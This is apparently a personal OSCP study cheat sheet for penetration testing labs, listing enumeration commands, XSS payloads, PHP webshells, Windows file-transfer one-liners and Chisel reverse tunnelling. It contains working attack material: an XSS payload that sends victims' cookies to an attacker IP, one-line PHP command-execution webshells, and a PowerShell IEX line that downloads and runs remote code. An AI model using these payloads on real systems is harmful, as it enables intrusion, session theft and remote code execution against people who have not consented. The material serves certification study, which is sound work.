# OSCP
OSCP Study Guide

## Table of Contents

## Enumeration and Recon



### subdomain enumeration

```
dig axfr @10.10.10.13 cronos.htb
```

### Web Enumeration

Nikto scanning:

```
nikto -h http://10.10.10.1
```

Directory busting with different tools:

DIRB

```
dirb http://10.10.10.1
```

Gobuster

```
gobuster dir -u http://10.129.155.74:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx
```

### Pentesting Website Applications

XSS Payloads:
Cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

Basic XSS form testing with either netcat listener or python web server
```
<img src=http://10.10.16.10/pwn.jpg/>
```

Cross Site scripting to dump base64 cookies. Make sure to url encode in burp with ctrl + u
```
<img src=x onerror=this.src='http://10.10.16.10/?cookies='+btoa(document.cookie) />
```
### Webshells

Reference: https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html

Simple PHP webshell for command execution

```
<?php system($_REQUEST ['cmd']) ?>
```

```
<?php system($_GET['cmd']); ?>
```

### Pentesting SNMP

Port 161 UDP

```
snmpwalk -c public -v2c 10.129.213.210
```

```
snmp-check 10.129.213.210
```

### Pentesting SMB

```
crackmapexec smb 10.129.70.254 
```

Detect anonymous shares that are open

```
smbclient -L //10.129.70.254
```

Null Authentication

```
smbclient -N -L //10.129.70.254
```

## Post Exploitation

### Downloading and Transferring Files

Certutil:

```
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
```

PowerShell:

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

```
powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.11.0.4/nc.exe')"
```

## Port forwarding and tunneling

Using Chisel:

Example using port forwarding so port 910 is available on kali box
```
on victim machine setup port forwarding
chisel.exe client 10.10.16.10:5555 R:910:127.0.0.1:910
```

```
On Kali attack box setup a reverse listner for port forward with chisel
./chisel server --port 5555 --reverse
```

